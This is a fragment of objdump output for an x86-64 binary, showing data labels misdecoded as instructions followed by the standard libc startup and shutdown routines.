    1a40:	and    BYTE PTR [rcx],dh
    1a42:	xor    BYTE PTR cs:[rax],ah
    1a45:	sub    BYTE PTR [rbx+0x29],ah
    1a48:	outs   dx,DWORD PTR ds:[rsi]
    1a49:	fs gs and BYTE PTR fs:[rdx+0x79],ah
    1a4f:	and    BYTE PTR [rdi+0x62],ah
    1a52:	outs   dx,DWORD PTR ds:[rsi]
    1a53:	jne    1ac7 <__libc_csu_init+0x27>
    1a55:	outs   dx,DWORD PTR gs:[esi]
    1a58:	sub    eax,0x78787878
    1a5d:	js     1ad7 <__libc_csu_init+0x37>
    1a5f:	js     1ad9 <__libc_csu_init+0x39>
	...

0000000000001a62 <dir_one>:
    1a62:	(bad)  
    1a63:	je     1ad2 <__libc_csu_init+0x32>
    1a65:	jo     1a96 <jump_offset+0x5>
    1a67:	je     1ace <__libc_csu_init+0x2e>
    1a69:	jae    1adf <__libc_csu_init+0x3f>
    1a6b:	(bad)  
	...

0000000000001a6d <dir_two>:
    1a6d:	(bad)  
    1a6e:	je     1add <__libc_csu_init+0x3d>
    1a70:	jo     1aa1 <__libc_csu_init+0x1>
    1a72:	je     1ad9 <__libc_csu_init+0x39>
    1a74:	jae    1aea <__libc_csu_init+0x4a>
    1a76:	xor    ch,BYTE PTR [rdi]
	...

0000000000001a79 <dir_all>:
    1a79:	(bad)  
    1a7a:	sbb    al,BYTE PTR [rax]
    1a7c:	add    BYTE PTR [rax],al
    1a7e:	add    BYTE PTR [rax],al
    1a80:	add    BYTE PTR [rbp+0x1a],ch
	...

0000000000001a91 <jump_offset>:
	...

0000000000001a99 <end_of_file>:
    1a99:	nop    DWORD PTR [rax+0x0]

0000000000001aa0 <__libc_csu_init>:
    1aa0:	push   r15
    1aa2:	push   r14
    1aa4:	mov    r15d,edi
    1aa7:	push   r13
    1aa9:	push   r12
    1aab:	lea    r12,[rip+0x201306]        # 202db8 <__frame_dummy_init_array_entry>
    1ab2:	push   rbp
    1ab3:	lea    rbp,[rip+0x201306]        # 202dc0 <__init_array_end>
    1aba:	push   rbx
    1abb:	mov    r14,rsi
    1abe:	mov    r13,rdx
    1ac1:	sub    rbp,r12
    1ac4:	sub    rsp,0x8
    1ac8:	sar    rbp,0x3
    1acc:	call   610 <_init>
    1ad1:	test   rbp,rbp
    1ad4:	je     1af6 <__libc_csu_init+0x56>
    1ad6:	xor    ebx,ebx
    1ad8:	nop    DWORD PTR [rax+rax*1+0x0]
    1ae0:	mov    rdx,r13
    1ae3:	mov    rsi,r14
    1ae6:	mov    edi,r15d
    1ae9:	call   QWORD PTR [r12+rbx*8]
    1aed:	add    rbx,0x1
    1af1:	cmp    rbp,rbx
    1af4:	jne    1ae0 <__libc_csu_init+0x40>
    1af6:	add    rsp,0x8
    1afa:	pop    rbx
    1afb:	pop    rbp
    1afc:	pop    r12
    1afe:	pop    r13
    1b00:	pop    r14
    1b02:	pop    r15
    1b04:	ret    
    1b05:	nop
    1b06:	nop    WORD PTR cs:[rax+rax*1+0x0]

0000000000001b10 <__libc_csu_fini>:
    1b10:	repz ret 

Disassembly of section .fini:

0000000000001b14 <_fini>:
    1b14:	sub    rsp,0x8
    1b18:	add    rsp,0x8
    1b1c:	ret    
